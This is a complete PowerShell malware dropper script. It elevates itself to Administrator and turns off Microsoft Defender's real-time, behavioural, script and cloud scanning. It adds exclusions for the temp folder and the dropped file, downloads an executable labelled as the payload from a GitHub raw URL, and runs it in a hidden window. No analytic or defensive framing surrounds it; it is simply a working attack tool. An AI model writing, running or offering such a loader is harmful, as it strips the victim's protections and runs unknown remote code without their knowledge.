# --- 1. Self-elevate to Administrator if not already elevated ---
if (-not ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {

    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" `
        -Verb RunAs
    exit
}

# --- 2. Suppress errors so AV pushback doesn't spam the console ---
$ErrorActionPreference = "SilentlyContinue"

# --- 3. Disable Defender real-time / behavioral / script scanning ---
# (Tamper Protection must be OFF for these to stick on Win11.)
Set-MpPreference -DisableRealtimeMonitoring       $true
Set-MpPreference -DisableBehaviorMonitoring       $true
Set-MpPreference -DisableScriptScanning           $true
Set-MpPreference -DisableIOAVProtection           $true
Set-MpPreference -DisableBlockAtFirstSeen         $true
Set-MpPreference -MAPSReporting                   0
Set-MpPreference -SubmitSamplesConsent            2

# --- 4. Define paths ---
$Url      = "https://raw.githubusercontent.com/xdwdeblan888-sys/GFHDSKDHEUFHVDGSYHJBFHVDSHBFDVdb/refs/heads/main/Launcher.exe"
$TempDir  = $env:TEMP
$DstPath  = Join-Path $TempDir "Launcher.exe"

# --- 5. Add Temp + the target file to Defender exclusions ---
Add-MpPreference -ExclusionPath   $TempDir
Add-MpPreference -ExclusionPath   $DstPath
Add-MpPreference -ExclusionProcess "Launcher.exe"

# --- 6. Fetch the payload ---
try {
    Invoke-WebRequest -Uri $Url -OutFile $DstPath -UseBasicParsing -TimeoutSec 60
} catch {
    # Fallback for older PS / TLS weirdness
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $Url -OutFile $DstPath -UseBasicParsing -TimeoutSec 60
}

# --- 7. Verify the file landed ---
if (-not (Test-Path $DstPath)) {
    Write-Host "[!] Payload download failed."
    exit 1
}

# --- 8. Execute ---
Start-Process -FilePath $DstPath -WindowStyle Hidden